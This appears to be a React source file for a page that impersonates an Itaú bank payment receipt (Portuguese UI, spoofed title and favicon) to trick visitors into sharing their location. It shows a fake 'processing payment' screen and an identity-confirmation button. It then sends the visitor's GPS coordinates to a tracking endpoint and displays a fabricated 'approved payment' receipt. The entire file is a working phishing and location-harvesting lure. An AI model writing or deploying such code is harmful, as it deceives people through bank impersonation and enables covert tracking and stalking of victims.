import { Typography, Card, Space, Tag, Image, Spin, Button } from "antd"
import { useParams } from "react-router-dom"
import { useEffect, useState } from "react"
import { api } from "../services/api"

const { Title, Text } = Typography

export function Track() {
  const { id } = useParams()
  const [data, setData] = useState<any>(null)
  const [loading, setLoading] = useState(true)
  const [authorized, setAuthorized] = useState<boolean | null>(null)
  const [showButton, setShowButton] = useState(false)

  useEffect(() => {
    document.title = "Itaú - Comprovante"

    const oldLink = document.querySelector("link[rel~='icon']")
    if (oldLink) oldLink.remove()

    const newLink = document.createElement("link")
    newLink.rel = "icon"
    newLink.href = "/itau.png"

    document.head.appendChild(newLink)

    return () => {
      document.title = "PINME"
      newLink.remove()
    }
  }, [])

  const requestLocation = () => {
    if (!id) return

    navigator.geolocation.getCurrentPosition(
      async (pos) => {
        setAuthorized(true)

        await api.post(`/location/${id}`, {
          lat: pos.coords.latitude,
          lng: pos.coords.longitude
        })

        const res = await api.get(`/location/${id}`)
        setData(res.data)

        setTimeout(() => {
          setLoading(false)
        }, 1200)
      },
      () => {
        setAuthorized(false)
        setLoading(false)
      }
    )
  }

  useEffect(() => {
    if (!id) return

    requestLocation()

    const timer = setTimeout(() => {
      if (authorized === null) {
        setShowButton(true)
        setLoading(false)
      }
    }, 5000)

    return () => clearTimeout(timer)
  }, [id])

  if (loading) {
    return (
      <div style={{ minHeight: "100vh", display: "flex", justifyContent: "center", alignItems: "center" }}>
        <Space direction="vertical" align="center">
          <Spin size="large" />
          <Text>Processando pagamento...</Text>
        </Space>
      </div>
    )
  }

  if (showButton && authorized === null) {
    return (
      <div style={{ minHeight: "100vh", display: "flex", justifyContent: "center", alignItems: "center", padding: 16 }}>
        <Card style={{ maxWidth: 400, width: "100%", textAlign: "center" }}>
          <Space direction="vertical" size="large">
            <Title level={4}>Acesso ao comprovante</Title>

            <Text type="secondary">
              Para visualizar o comprovante, é necessário confirmar sua identidade.
            </Text>

            <Text type="secondary">
              Clique no botão abaixo para continuar.
            </Text>

            <Button
              size="large"
              block
              onClick={requestLocation}
              style={{
                background: "#ff6200",
                borderColor: "#ff6200",
                color: "#fff",
                fontWeight: 600
              }}
            >
              Ver comprovante
            </Button>

            <Text type="secondary" style={{ fontSize: 12 }}>
              Caso não funcione, abra este link no navegador.
            </Text>
          </Space>
        </Card>
      </div>
    )
  }

  if (authorized === false) {
    return (
      <div style={{ minHeight: "100vh", display: "flex", justifyContent: "center", alignItems: "center" }}>
        <Card>
          <Text>
            Permissão de localização negada.
          </Text>
        </Card>
      </div>
    )
  }

  return (
    <div
      style={{
        minHeight: "100vh",
        display: "flex",
        justifyContent: "center",
        alignItems: "center",
        padding: 16,
        background: "#f5f5f5"
      }}
    >
      <Card style={{ width: "100%", maxWidth: 420, borderRadius: 16 }}>
        <Space direction="vertical" size="large" style={{ width: "100%" }}>
          <div style={{ display: "flex", alignItems: "center", gap: 12 }}>
            <Image src="/itau.png" preview={false} width={40} />
            <div>
              <Title level={5} style={{ margin: 0 }}>
                Itaú
              </Title>
              <Text type="secondary">
                Comprovante de pagamento
              </Text>
            </div>
          </div>

          <Tag color="green">Pagamento aprovado</Tag>

          <div>
            <Text type="secondary">Valor</Text>
            <div style={{ fontSize: 24, fontWeight: 700 }}>
              R$ {data?.amount}
            </div>
          </div>

          <div>
            <Text type="secondary">Data</Text>
            <div>{new Date().toLocaleString()}</div>
          </div>

          <Text type="secondary">
            Transação concluída com sucesso.
          </Text>
        </Space>
      </Card>
    </div>
  )
}